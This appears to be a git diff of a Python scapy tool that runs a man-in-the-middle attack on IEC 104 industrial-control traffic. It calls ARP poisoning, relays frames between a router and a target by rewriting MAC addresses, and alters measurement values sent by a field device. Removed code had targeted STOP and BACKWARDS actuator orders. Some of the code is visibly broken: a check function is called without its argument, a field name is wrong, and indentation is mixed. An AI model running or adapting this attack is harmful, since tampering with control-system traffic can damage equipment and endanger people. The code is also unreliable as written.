@@ -4,15 +4,12 @@
     Use scapy to modify packets going through your machine.
     Based on nfqueue to block packets in the kernel and pass them to scapy for validation
 """
-
-from iec104lib import *
 from iec104lib import *
 from EchoIEC104Server import *
 
-
-
 ip_router = ARP_poisoning.get_iprouter()
 ip_target= ARP_poisoning.get_ipdest()
+ip_attack = ARP_poisoning.get_ipsrc()
 mac_router=ARP_poisoning.get_mac(ip_router)
 mac_target=ARP_poisoning.get_mac(ip_target)
 
@@ -30,9 +27,23 @@ ASDU_ACT_ORDER_STOP_VALUE_STR="\x00\x00"
 ASDU_ACT_ORDER_BACKWARDS_VALUE_STR="\x07\x00"
 ASDU_ACT_ORDER_FORWARD_VALUE_STR="\xe7\x00"
 
-	
+def modify_packet_for_target(chosen_packet) :
+	chosen_packet[Ether].src = chosen_packet[Ether].dest
+	chosen_packet[Ether].dest = mac_target
 
-def modify_stop_packet(chosen_packet):
+	#delete the checksum so that scapy will handle them and recalculate them
+	del chosen_packet[IP].chksum
+	del chosen_packet[TCP].chksum
+
+def modify_packet_for_router(chosen_packet) :
+	chosen_packet[Ether].src = chosen_packet[Ether].dest
+	chosen_packet[Ether].dest = mac_router
+
+	#delete the checksum so that scapy will handle them and recalculate them
+	del chosen_packet[IP].chksum
+	del chosen_packet[TCP].chksum
+
+def modify_mesure_packet(chosen_packet):
 	#get a list of bytes from the payload
 	copied_packet_payload_list=list(str(chosen_packet[TCP].payload))
 	print("\t before : "+"".join(copied_packet_payload_list).encode("hex"))
@@ -42,12 +53,9 @@ def modify_stop_packet(chosen_packet):
 	#put the changed payload in the original packet
 	chosen_packet[TCP].payload=Raw(new_payload)
 	print("\t after  : "+new_payload.encode("hex"))
-	#TODO : change the mac_dst address!
-	
-	#delete the checksum so that scapy will handle them and recalculate them
-	del chosen_packet[IP].chksum 
-	del chosen_packet[TCP].chksum
+
 	#print(chosen_packet.show2())
+
 
 def is_packet_containing_apci(packet):
 	if packet.haslayer(u_frame) or packet.haslayer(s_frame) or packet.haslayer(i_frame) :
@@ -68,39 +76,25 @@ def is_104_packet_from_raspberry(packet):
 		return False
 
 
-def is_STOP_order_packet(chosen_packet):
-	if( not is_104_packet_from_raspberry(chosen_packet)):
+def is_packet_mesure_packet(packet):
+	if( is_packet_containing_apci(packet) and is_104_packet_from_raspberry(packet) and packet.haslayer(asdu_infobj_13)) :
+		return True
+	else :
 		return False
-	# payload_packet=str(chosen_packet[TCP].payload)
-	# asdu_type=payload_packet[LENGTH_APCI:LENGTH_APCI+ASDU_TYPE_BYTE]
-	if(asdu_type == ASDU_TYPE_ACT_CHAR):
-		asdu_order_value=payload_packet[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]
-		if(asdu_order_value == ASDU_ACT_ORDER_STOP_VALUE_STR or asdu_order_value ==ASDU_ACT_ORDER_BACKWARDS_VALUE_STR):
-			return True
-			modify_stop_packet(chosen_packet)
-
-	return False
 
 
-def callback_sniff(packet):
-	#packet[Ether].src == MAC_CONTROLLER and
-	if(packet[Ether].src == mac_router and packet[IP].src==ip_router and packet[IP].dst==ip_target):
+def mitm(chosen_packet):
 
-		if is_packet_containing_apci() and is_:
-			modify_stop_packet(packet)
-#	else:
-#		print("not TCP")
-#		print(packet.summary())
-		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)
+	if(chosen_packet[Ether].src == mac_router and chosen_packet[IP].src==ip_router and chosen_packet[IP].dst==ip_target):
+		modify_packet_for_target(chosen_packet)
+		if is_packet_mesure_packet():
+			modify_mesure_packet(chosen_packet)
 
+		send(chosen_packet, verbose=False)
 
-
-	if(packet[Ether].src == mac_target and packet[IP].src==ip_target and packet[IP].dst==ip_router):
-		#print("p->c")		
-#	else:
-#		print("not TCP")
-#		print(packet.summary())
-		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)
+	if(chosen_packet[Ether].src == mac_target and chosen_packet[IP].src==ip_target and chosen_packet[IP].dst==ip_router):
+		modify_packet_for_router(chosen_packet)
+		send(chosen_packet, verbose=False)
 
 def loop_sleep():
 	while 1:
@@ -112,7 +106,7 @@ def loop_sleep():
 def main_sniff():
 
 	print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
-	sniff(prn=callback_sniff,filter="ip")
+	sniff(prn=mitm, filter="ip")
 
 	start_ip_forward()
 	print("MitM with full forward until ctrl-c")
@@ -121,4 +115,7 @@ def main_sniff():
 	stop_ip_forward()
 
 if __name__ == "__main__":
+	ARP_poisoning.poisoning()
+	EchoIEC104Server.server()
     main_sniff()
+
